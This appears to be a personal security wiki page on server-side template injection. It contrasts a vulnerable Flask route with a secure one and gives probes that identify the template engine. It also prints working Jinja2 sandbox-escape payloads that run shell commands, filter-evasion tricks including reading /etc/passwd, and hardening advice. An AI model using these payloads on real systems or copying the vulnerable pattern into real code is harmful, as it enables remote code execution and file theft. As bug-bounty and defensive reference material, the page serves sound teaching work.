---
title: Server-Side Template Injection (SSTI) & Engine Exploitation
created: 2026-09-24
updated: 2026-09-24
type: concept
tags:
  - ssti
  - rce
  - bug-bounty
sources:
  - unprocessed-obsidians/ssti.md
confidence: high
contested: false
contradictions: []
---

# Server-Side Template Injection (SSTI) & Engine Exploitation

## Overview
Server-Side Template Injection (SSTI) occurs when user-supplied input is directly concatenated into a template engine's source string rather than passed as a contextual data variable. When the template engine parses and compiles the template, embedded expressions are evaluated on the server with the permissions of the application process, frequently resulting in arbitrary Remote Code Execution (RCE).

## Vulnerable vs Secure Patterns (Jinja2 / Flask Example)

### Vulnerable Pattern
Directly formatting user input into template string syntax:
```python
@app.route('/hello')
def hello():
    name = request.args.get('name')
    template = f'<h1>Hello {name}</h1>' # Insecure concatenation
    return render_template_string(template)
```

### Secure Pattern
Passing untrusted input as parameters into a static template:
```python
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template('hello.html', name=name) # Context-bound evaluation
```

## Detection & Engine Fingerprinting Decision Tree

```
                       Inject: ${{7*7}} / {{7*7}}
                                 |
                  +--------------+--------------+
                  |                             |
             Evaluates: 49                 No Evaluation (XSS probe)
                  |
         Inject: {{7*'7'}}
                  |
         +--------+--------+
         |                 |
     "49" (Twig)      "7777777" (Jinja2)
```

| Engine | Language | Identification Probe | Expected Result |
| :--- | :--- | :--- | :--- |
| **Jinja2** | Python | `{{7*'7'}}` | `7777777` |
| **Twig** | PHP | `{{7*'7'}}` | `49` |
| **FreeMarker** | Java | `${7*7}` or `[#ftl]${7*7}` | `49` |
| **Velocity** | Java | `#set($x=7*7)${x}` | `49` |
| **ERB** | Ruby | `<%= 7*7 %>` | `49` |
| **Smarty** | PHP | `{php}echo 7*7;{/php}` or `{$smarty.version}` | Smarty version string |

## Python / Jinja2 MRO Sandbox Escape to RCE
Python template engines permit object traversal via Method Resolution Order (`__mro__`) to find loaded classes capable of spawning processes:
1. Access base class:
   ```jinja2
   {{ ''.__class__.__mro__[1] }}
   ```
2. Locate `subprocess.Popen` or `os` modules across `__subclasses__()`:
   ```jinja2
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
3. Execute shell commands:
   ```jinja2
   {{ ''.__class__.__mro__[1].__subclasses__()[40]('/bin/sh -c "id"',shell=True,stdout=-1).communicate()[0] }}
   ```
   Or via `lipsum` / `cycler` global objects:
   ```jinja2
   {{ lipsum.__globals__['os'].popen('id').read() }}
   {{ cycler.__init__.__globals__.os.popen('id').read() }}
   ```

## Advanced Filter Evasion
- **Bypassing Quotes**:
  - Utilizing request parameters: `{{ request.args.param }}` with `?param=cat /etc/passwd`
  - Utilizing character generation: `chr(47)`
- **Bypassing Underscores (`_`)**:
  - Accessing attributes via dictionary lookup: `{{ ''['__class__'] }}`
- **Bypassing Square Brackets (`[]`)**:
  - Utilizing `__getitem__`: `{{ ''.__class__.__mro__.__getitem__(1) }}`
  - Utilizing `attr()` filter: `{{ (''|attr('__class__')).mro()[1] }}`

## Defensive Hardening
- Never concatenate raw user input into template strings; mandate parameter-bound templates.
- Enforce strict template sandboxing (e.g. Jinja2 `SandboxedEnvironment`) with disabled dangerous attributes.
- Apply logic separation: templates should handle presentation logic only, without access to execution runtimes.

## Related Pages
- [[ssti]]
- [[cross-site-scripting]]
- [[deserialization-attacks]]
- [[ai-security-testing]]
